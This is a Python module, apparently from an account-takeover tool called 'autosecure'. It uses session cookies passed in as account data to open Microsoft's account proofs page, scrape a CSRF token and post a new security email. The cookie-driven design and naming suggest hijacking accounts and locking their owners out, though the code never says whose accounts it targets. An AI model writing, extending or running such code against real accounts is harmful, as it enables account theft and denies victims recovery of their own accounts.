"""Primary email change service."""

from __future__ import annotations

import re
from typing import Any

from autosecure.core.logging import get_logger
from autosecure.services.microsoft._http import MicrosoftHTTPClient

log = get_logger("securing.make_primary")

PROOFS_URL = "https://account.live.com/proofs"


async def make_primary_email(
    account_data: dict[str, Any],
    new_email: str,
) -> bool:
    """Change the primary/security email on a Microsoft account.

    Uses the authenticated session from account_data to initiate
    a security email change to new_email.

    Args:
        account_data: Authenticated account data with cookies.
        new_email: The new email to set as primary.

    Returns:
        True if the email change was initiated successfully.
    """
    log.info("make_primary_email.start", new_email=new_email)

    cookies = account_data.get("cookies", {})
    if not cookies:
        log.warning("make_primary_email.no_cookies")
        return False

    try:
        async with MicrosoftHTTPClient(cookies=cookies) as client:
            response = await client.get(PROOFS_URL)

            if response.status_code != 200:
                log.warning(
                    "make_primary_page.failed",
                    status=response.status_code,
                )
                return False

            csrf_token = _extract_csrf(response.text)
            if not csrf_token:
                log.warning("make_primary_email.csrf_not_found")
                return False

            change_response = await client.post(
                f"{PROOFS_URL}/AddEmail",
                data={
                    "iessionToken": csrf_token,
                    "newEmail": new_email,
                    "proofType": "email",
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )

            success = change_response.status_code == 200
            if success:
                log.info("make_primary_email.success", new_email=new_email)
            else:
                log.warning(
                    "make_primary_email.failed",
                    status=change_response.status_code,
                )
            return success

    except Exception as e:
        log.error("make_primary_email.error", error=str(e))
        return False


def _extract_csrf(html: str) -> str:
    """Extract CSRF token from the proofs page HTML.

    Args:
        html: Raw HTML from the proofs page.

    Returns:
        CSRF token string, or empty string if not found.
    """
    patterns = [
        r'name="iessionToken"[^>]*value="([^"]+)"',
        r'"csrfToken"\s*:\s*"([^"]+)"',
        r'"token"\s*:\s*"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return ""
